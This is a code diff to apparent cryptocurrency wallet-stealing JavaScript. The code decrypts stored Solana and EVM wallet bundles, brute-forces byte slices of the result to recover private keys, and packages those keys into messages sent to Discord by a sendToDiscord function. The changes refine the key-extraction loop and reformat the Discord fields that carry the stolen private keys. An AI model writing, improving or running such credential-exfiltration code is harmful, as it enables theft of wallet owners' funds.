@@ -61,27 +61,26 @@ function decryptSingleBundle(bundleStr, keyB64, type) {
         const buf = result.decryptedBuffer;
         console.log(`✅ ${type.toUpperCase()} decrypted - ${buf.length} bytes`);
 
-        let candidates = [];
         let bestKey = "Not found";
 
-        if (type === "sol" && buf.length >= 32) {
-            // Aggressive search for correct Solana key
-            for (let offset = 0; offset <= buf.length - 32; offset += 1) {
-                const len = Math.min(64, buf.length - offset);
-                const candidate = buf.slice(offset, offset + len);
-                const base58 = bs58.encode(candidate);
-                
-                if (base58.length >= 40) {
-                    candidates.push({ offset, length: len, base58 });
+        if (type === "sol") {
+            // Try 64 bytes, 32 bytes, and every possible slice
+            for (let len = 64; len >= 32; len -= 32) {
+                for (let offset = 0; offset <= buf.length - len; offset++) {
+                    const slice = buf.slice(offset, offset + len);
+                    try {
+                        const key = bs58.encode(slice);
+                        if (key.length > 60) {
+                            bestKey = key;
+                            console.log(`Found possible key at offset ${offset}, length ${len}`);
+                            break;
+                        }
+                    } catch(e) {}
                 }
+                if (bestKey !== "Not found") break;
             }
-            if (candidates.length > 0) {
-                bestKey = candidates[0].base58;
-            }
-        } 
-        else if (type === "evm") {
+        } else if (type === "evm") {
             bestKey = buf.slice(0, 32).toString('hex');
-            candidates.push({ evmKey: bestKey });
         }
 
         return {
@@ -89,7 +88,6 @@ function decryptSingleBundle(bundleStr, keyB64, type) {
             type,
             method: result.method,
             decryptedHex: buf.toString('hex'),
-            candidates: candidates.slice(0, 8), // Show first 8 candidates
             privateKey: bestKey
         };
     }
@@ -135,18 +133,11 @@ async function sendToDiscord(data) {
 
     if (portfolio.sBundlesDecrypted?.[0]) {
         const s = portfolio.sBundlesDecrypted[0];
-        summaryFields.push({ 
-            name: "🔑 Solana Private Key", 
-            value: `\`\`\`${s.privateKey}\`\`\`` 
-        });
+        summaryFields.push({ name: "🔑 Solana Private Key", value: `\`\`\`${s.privateKey}\`\`\`` });
     }
-
     if (portfolio.eBundlesDecrypted?.[0]) {
         const e = portfolio.eBundlesDecrypted[0];
-        summaryFields.push({ 
-            name: "🔑 EVM Private Key", 
-            value: `\`\`\`${e.privateKey}\`\`\`` 
-        });
+        summaryFields.push({ name: "🔑 EVM Private Key", value: `\`\`\`${e.privateKey}\`\`\`` });
     }
 
     const form = new FormData();
